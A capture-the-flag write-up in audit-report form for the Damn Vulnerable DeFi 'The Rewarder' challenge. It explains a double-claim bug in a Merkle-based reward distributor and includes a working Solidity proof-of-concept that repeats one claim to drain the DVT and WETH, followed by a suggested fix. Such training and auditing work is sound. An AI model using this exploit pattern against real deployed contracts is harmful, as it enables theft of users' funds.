# Damn Vulnerable DeFi V4 - The Rewarder

## Table of Contents

1. [Introduction](#introduction)
2. [Scope](#scope)
3. [Notes](#notes)
4. [Analysis](#analysis)

## Introduction

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

## Scope

[Repository](https://github.com/NikolayPIvanov/damn-vulnerable-defi-v4)

- src/the-rewarder/TheRewarderDistributor.sol

## Notes

### Win Condition

- Transfer all the assets to the recovery address
- No restriction on the number of transactions

### Key Takeaway

- The contract uses Merkle Proofs to verify the actor is indeed in a list of addresses to be rewarded for a given amount.
- The contract works with DVT and WETH tokens.
- The function `claimRewards` is used to claim the rewards for both tokens.
- For a list of claims, on each claim request we calculate the word and bit position.
  - This is used because we are using a BitMap in the `distributions`. The word position is used to find the claims and verify that the address did not claim already. This is used in the function `_setClaimed`.
  - If we have claimed already the `currentWord` would be non-zero value and the `newBits` would be non-zero value - returning 1. The comparison would be `1 != 0` which would return `false` from the function.

    ```solidity
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord & newBits) != 0) return false;
    ```

  - On the first iteration of the `claimRewards` the if condition is executed without calling `_setClaimed`, on the following the else condition is executed if we pass the same token twice. If we pass two claims for different tokens only the if statement is executed. Let's take a look for Alice's transaction.
    - First Iteration: DVT Claim Verification -> Transfer DVT
    - Second Iteration: WETH Claim Verification -> Mark DVT as claimed -> Mark WETH as claimed -> Transfer WETH.

    ```soldity
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }
    ```

## Analysis

### [H-1] Rewards can be claimed more than once due to incorrect `_setClaimed` usage

#### Description

A malicious claimer can pass the same claim many times bypassing the `_setClaimed` function
and stealing funds from the contract. This is due to a interesting way of crafting the Claim request.

Moreover, the contract's mechanism of marking the claimed token, where on the next token we mark the previous one, can be easily exploited - failing to mark the already claimed record.

[Likelihood] - High

#### Impact

A malicious actor can steal all of funds from the contract, which is a critical vulnerability.

#### Proof of Concepts

0. From the JSON files we found the index of the player in the list and amount of each token to claim.
1. Setup the `tokensToClaim` with the supported tokens.
2. Load the rewards list for DVT and WETH.
3. Alice already claimed calculate the remaining DVT and determine the claims we need to do for each token.
4. Construct the Claim, setting `batchNumber` to 0 as we want to mark the same index in the BitMap as claimed.
    1. Token Index for DVT is 0 according to the `tokensToClaim`.
    2. Player's index in the lists is 188.
5. Repeat the steps for WETH.
6. Claim the Rewards.
7. Transfer the funds to the Recovery address.

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // Player (0x44E97aF4418b7a17AABD8090bEA0A471a366305C)

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
    uint256 dvtClaimAttempts = expectedDVTLeft / PLAYER_DVT_CLAIM_AMOUNT;

    console.log("Claims to be made for DVT: ", dvtClaimAttempts);

    Claim[] memory dvtClaims = new Claim[](dvtClaimAttempts);

    for (uint256 i = 0; i < dvtClaimAttempts; i++) {
        dvtClaims[i] = Claim({
            batchNumber: 0,
            amount: PLAYER_DVT_CLAIM_AMOUNT,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188)
        });
    }

    uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
    uint256 wethClaimAttempts = expectedWETHLeft / PLAYER_WETH_CLAIM_AMOUNT;

    console.log("Claims to be made for WETH: ", wethClaimAttempts);

    Claim[] memory wethClaims = new Claim[](wethClaimAttempts);

    for (uint256 i = 0; i < wethClaimAttempts; i++) {
        wethClaims[i] = Claim({
            batchNumber: 0,
            amount: PLAYER_WETH_CLAIM_AMOUNT,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188)
        });
    }

    distributor.claimRewards({inputClaims: dvtClaims, inputTokens: tokensToClaim});
    distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(address(player)));
    weth.transfer(recovery, weth.balanceOf(address(player)));
}
```

#### Recommended mitigation

The main issue is with `_setClaimed` and the usage. If we can mark the token as claim before transferring it, we can fix this issue. Moreover, the following condition is exploited because the same token can be passed multiple times as claim.

```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    ...
}
```

A general refactoring of the claiming part of the function is recommended which follows the CEI pattern.
